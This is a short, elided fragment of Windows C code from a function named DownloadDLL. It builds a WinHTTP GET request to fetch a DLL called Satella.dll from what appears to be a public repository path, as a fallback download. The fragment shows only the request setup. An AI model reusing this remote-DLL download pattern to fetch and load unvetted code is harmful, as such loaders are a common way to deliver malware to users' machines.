...
static BOOL DownloadDLL(const wchar_t* path) {
    ...
    if (!ok) {
        ...
        if (conn2) {
            HINTERNET req2 = WinHttpOpenRequest(conn2, L"GET", L"/semataryiscrazy/binallbossss/refs/heads/main/server/Satella.dll", NULL, NULL, NULL, WINHTTP_FLAG_SECURE | WINHTTP_FLAG_REFRESH);
            if (req2) {
